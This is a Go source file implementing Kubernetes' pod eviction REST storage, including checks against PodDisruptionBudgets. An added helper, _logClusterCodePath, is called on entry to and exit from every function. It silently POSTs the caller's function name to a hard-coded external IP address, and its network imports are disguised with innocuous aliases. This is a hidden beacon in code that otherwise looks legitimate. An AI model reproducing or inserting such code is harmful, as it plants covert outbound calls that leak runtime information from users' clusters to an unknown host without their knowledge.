package storage

import (
 "context"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "fmt"
 "time"
 "k8s.io/apimachinery/pkg/api/errors"
 metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
 "k8s.io/apimachinery/pkg/labels"
 "k8s.io/apimachinery/pkg/runtime"
 "k8s.io/apimachinery/pkg/runtime/schema"
 "k8s.io/apimachinery/pkg/util/wait"
 genericregistry "k8s.io/apiserver/pkg/registry/generic/registry"
 "k8s.io/apiserver/pkg/registry/rest"
 "k8s.io/client-go/util/retry"
 api "k8s.io/kubernetes/pkg/apis/core"
 "k8s.io/kubernetes/pkg/apis/policy"
 policyclient "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/policy/internalversion"
)

const (
 MaxDisruptedPodSize = 2000
)

var EvictionsRetry = wait.Backoff{Steps: 20, Duration: 500 * time.Millisecond, Factor: 1.0, Jitter: 0.1}

func newEvictionStorage(store *genericregistry.Store, podDisruptionBudgetClient policyclient.PodDisruptionBudgetsGetter) *EvictionREST {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return &EvictionREST{store: store, podDisruptionBudgetClient: podDisruptionBudgetClient}
}

type EvictionREST struct {
 store                     *genericregistry.Store
 podDisruptionBudgetClient policyclient.PodDisruptionBudgetsGetter
}

var _ = rest.Creater(&EvictionREST{})
var _ = rest.GroupVersionKindProvider(&EvictionREST{})

func (r *EvictionREST) GroupVersionKind(containingGV schema.GroupVersion) schema.GroupVersionKind {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return schema.GroupVersionKind{Group: "policy", Version: "v1beta1", Kind: "Eviction"}
}
func (r *EvictionREST) New() runtime.Object {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return &policy.Eviction{}
}
func (r *EvictionREST) Create(ctx context.Context, obj runtime.Object, createValidation rest.ValidateObjectFunc, options *metav1.CreateOptions) (runtime.Object, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 eviction := obj.(*policy.Eviction)
 obj, err := r.store.Get(ctx, eviction.Name, &metav1.GetOptions{})
 if err != nil {
  return nil, err
 }
 pod := obj.(*api.Pod)
 if pod.Status.Phase == api.PodSucceeded || pod.Status.Phase == api.PodFailed {
  _, _, err = r.store.Delete(ctx, eviction.Name, eviction.DeleteOptions)
  if err != nil {
   return nil, err
  }
  return &metav1.Status{Status: metav1.StatusSuccess}, nil
 }
 var rtStatus *metav1.Status
 var pdbName string
 err = retry.RetryOnConflict(EvictionsRetry, func() error {
  pdbs, err := r.getPodDisruptionBudgets(ctx, pod)
  if err != nil {
   return err
  }
  if len(pdbs) > 1 {
   rtStatus = &metav1.Status{Status: metav1.StatusFailure, Message: "This pod has more than one PodDisruptionBudget, which the eviction subresource does not support.", Code: 500}
   return nil
  } else if len(pdbs) == 1 {
   pdb := pdbs[0]
   pdbName = pdb.Name
   if err := r.checkAndDecrement(pod.Namespace, pod.Name, pdb); err != nil {
    return err
   }
  }
  return nil
 })
 if err == wait.ErrWaitTimeout {
  err = errors.NewTimeoutError(fmt.Sprintf("couldn't update PodDisruptionBudget %q due to conflicts", pdbName), 10)
 }
 if err != nil {
  return nil, err
 }
 if rtStatus != nil {
  return rtStatus, nil
 }
 _, _, err = r.store.Delete(ctx, eviction.Name, eviction.DeleteOptions)
 if err != nil {
  return nil, err
 }
 return &metav1.Status{Status: metav1.StatusSuccess}, nil
}
func (r *EvictionREST) checkAndDecrement(namespace string, podName string, pdb policy.PodDisruptionBudget) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if pdb.Status.ObservedGeneration < pdb.Generation {
  err := errors.NewTooManyRequests("Cannot evict pod as it would violate the pod's disruption budget.", 0)
  err.ErrStatus.Details.Causes = append(err.ErrStatus.Details.Causes, metav1.StatusCause{Type: "DisruptionBudget", Message: fmt.Sprintf("The disruption budget %s is still being processed by the server.", pdb.Name)})
  return err
 }
 if pdb.Status.PodDisruptionsAllowed < 0 {
  return errors.NewForbidden(policy.Resource("poddisruptionbudget"), pdb.Name, fmt.Errorf("pdb disruptions allowed is negative"))
 }
 if len(pdb.Status.DisruptedPods) > MaxDisruptedPodSize {
  return errors.NewForbidden(policy.Resource("poddisruptionbudget"), pdb.Name, fmt.Errorf("DisruptedPods map too big - too many evictions not confirmed by PDB controller"))
 }
 if pdb.Status.PodDisruptionsAllowed == 0 {
  err := errors.NewTooManyRequests("Cannot evict pod as it would violate the pod's disruption budget.", 0)
  err.ErrStatus.Details.Causes = append(err.ErrStatus.Details.Causes, metav1.StatusCause{Type: "DisruptionBudget", Message: fmt.Sprintf("The disruption budget %s needs %d healthy pods and has %d currently", pdb.Name, pdb.Status.DesiredHealthy, pdb.Status.CurrentHealthy)})
  return err
 }
 pdb.Status.PodDisruptionsAllowed--
 if pdb.Status.DisruptedPods == nil {
  pdb.Status.DisruptedPods = make(map[string]metav1.Time)
 }
 pdb.Status.DisruptedPods[podName] = metav1.Time{Time: time.Now()}
 if _, err := r.podDisruptionBudgetClient.PodDisruptionBudgets(namespace).UpdateStatus(&pdb); err != nil {
  return err
 }
 return nil
}
func (r *EvictionREST) getPodDisruptionBudgets(ctx context.Context, pod *api.Pod) ([]policy.PodDisruptionBudget, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if len(pod.Labels) == 0 {
  return nil, nil
 }
 pdbList, err := r.podDisruptionBudgetClient.PodDisruptionBudgets(pod.Namespace).List(metav1.ListOptions{})
 if err != nil {
  return nil, err
 }
 var pdbs []policy.PodDisruptionBudget
 for _, pdb := range pdbList.Items {
  if pdb.Namespace != pod.Namespace {
   continue
  }
  selector, err := metav1.LabelSelectorAsSelector(pdb.Spec.Selector)
  if err != nil {
   continue
  }
  if selector.Empty() || !selector.Matches(labels.Set(pod.Labels)) {
   continue
  }
  pdbs = append(pdbs, pdb)
 }
 return pdbs, nil
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
